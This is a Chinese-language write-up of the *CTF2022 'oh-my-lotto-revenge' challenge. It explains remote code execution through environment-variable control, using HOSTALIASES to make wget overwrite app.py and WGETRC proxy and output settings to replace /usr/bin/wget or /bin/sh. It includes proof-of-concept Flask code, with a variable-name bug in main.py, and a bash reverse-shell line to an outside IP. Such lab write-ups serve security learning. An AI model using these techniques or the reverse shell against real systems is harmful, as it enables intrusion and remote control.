# [*CTF2022] oh-my-lotto-revenge


## New

相对于[oh_my_lotto](https://www.huamang.xyz/index.php/archives/152/#h2ZAoFX0WCRWOf64MY)，revenge进行了下面的更改

![image-20220419222428531](https://tuchuang.huamang.xyz/img/image-20220419222428531.png)

![image-20220419222450446](https://tuchuang.huamang.xyz/img/image-20220419222450446.png)

这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作环境变量

```python
os.environ[lotto_key] = lotto_value
```

这里有几个非预期解，先看看预期解

## Intented writeup

这里可以操控环境变量，那么我们能做的事情就很多了，预期解是操控`HOSTALIASES`修改hosts

因为他的wget是通过域名下载的

```python
os.system('wget --content-disposition -N lotto')
```

我们把伪造的hosts文件通过forecast路由传到服务器，然后修改环境变量把hosts指向`/app/guess/forecast.txt`

剩下的就是如何利用了，可以发现wget的参数是`--content-disposition -N`

对于这个参数的意义，我在谷歌找到了如下定义：他是可以由服务器端决定下载的文件，-N表示文件名不变进行覆盖

![image-20220419232146985](https://tuchuang.huamang.xyz/img/image-20220419232146985.png)、

这样的话，我们就可以操控他下载的文件，去进行覆盖app.py

我查找了这个http头的[语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition#%E4%BD%9C%E4%B8%BA%E6%B6%88%E6%81%AF%E4%B8%BB%E4%BD%93%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E5%A4%B4)

我们只需要在http头指定app.py即可把恶意的app.py覆盖掉源文件

![image-20220419232610529](https://tuchuang.huamang.xyz/img/image-20220419232610529.png)

这样的话我们就可以编写如下poc

app.py

```
import flask
import os

app = flask.Flask(__name__)
@app.route("/rce")
def rce():
    return str(os.popen('env').read())

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=8080)
```

main.py

```
import flask
import os

app = flask.Flask(__name__)
@app.route("/")
def index():
    with open('app.py','rb') as f:
        res = f.read()
    r = flask.make_response(res)
    response.headers['Content-Type'] = 'text/plain'
    response.headers['Content-Disposition'] = 'attachment; filename=app.py'
    return response

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=8899)
```

在服务器启动main.py，然后上传伪造hosts文件

```
# hosts
lotto domain
```

然后在lotto页面修改环境变量

```
HOSTALIASES
/app/guess/forecast.txt
```

![image-20220420000125065](https://tuchuang.huamang.xyz/img/image-20220420000125065.png)

然后在服务器添加反代，把8899端口转发到80端口

![image-20220420010655831](https://tuchuang.huamang.xyz/img/image-20220420010655831.png)

可以发现app.py成功被覆盖

![image-20220420011927033](https://tuchuang.huamang.xyz/img/image-20220420011927033.png)

但是发现他还是原来的服务

![image-20220420012154011](https://tuchuang.huamang.xyz/img/image-20220420012154011.png)

是因为服务是gunicorn搭建起来的，他更新py文件以后不会实时更新，而gunicorn有一个`pre-forked worker`机制，当某个worker超时以后，就会让gunicorn重启该worker

我们可以抓包进行爆破服务让他崩溃重启

![image-20220420012722538](https://tuchuang.huamang.xyz/img/image-20220420012722538.png)

崩溃后，成功拿到flag

![image-20220420012625604](https://tuchuang.huamang.xyz/img/image-20220420012625604.png)

预期解至此

## Unintented writeup

非预期解，这里我只知道一直就是利用`WGETRC`，配合`http_proxy`和`output_document`，覆盖本地的wget应用，然后利用wget完成RCE



查[官方文档](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html)可知，wget会找环境变量WGETRC，加载wgetrc文件

![image-20220420015237967](https://tuchuang.huamang.xyz/img/image-20220420015237967.png)

而具体利用wgetrc就是看这篇[官方文档](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html)

这样的话，就是通过上传我们构造的wgetrc去进行攻击

这里注意了这几个配置项

```
# 把记录写到file里
output_document = file
		Set the output filename—the same as ‘-O file’.

# 设置HTTP代理
http_proxy = string
Use string as HTTP proxy, instead of the one specified in environment.
```

我在本机测试了一下，设置了http_proxy以后，wget下载的都是代理服务器的文件

通过这个代理服务器，我们可以通过修改代理服务器的东西去修改返回值，然后利用output_document进行覆盖

### 0x01

因为我们只能执行wget，所以我们直接索性覆盖wget

构造如下wgetrc文件

```
output_document = /usr/bin/wget
http_proxy = test.huamang.xyz
https_proxy = test.huamang.xyz
```

在代理服务器开一个80端口的web服务，写着反弹shell的命令

```
#!/bin/bash
bash -c "bash -i < /dev/tcp/10.211.55.4/8888 1<&0 2<&0"
```

![image-20220420021548280](https://tuchuang.huamang.xyz/img/image-20220420021548280.png)

把文件传上去，然后去lotto路由修改`WGETRC`的值为`/app/guess/forecast.txt`

然后触发wget命令，拿到flag

![image-20220420031942691](https://tuchuang.huamang.xyz/img/image-20220420031942691.png)

但是这个方法不够优雅，会覆盖掉wget，让其他选手没有体验感

### 0x02

WGETRC还有一个参数

```
use_askpass=/bin/xxx
```

通过这个参数可以直接执行二进制文件，但是wget下载的文件，是没有x权限的，无法执行

所以我们可以通过覆盖掉/bin/sh后（题目使用的是/usr/bin/），再利用这个参数去执行他

所以具体步骤是：

首先上传如下文件，覆盖掉可以执行文件

```
output_document = /bin/sh
http_proxy = test.huamang.xyz
https_proxy = test.huamang.xyz
```

然后上传use_askpass参数去执行命令

```
use_askpass=/bin/sh
```

成功RCE

![image-20220420034358312](https://tuchuang.huamang.xyz/img/image-20220420034358312.png)

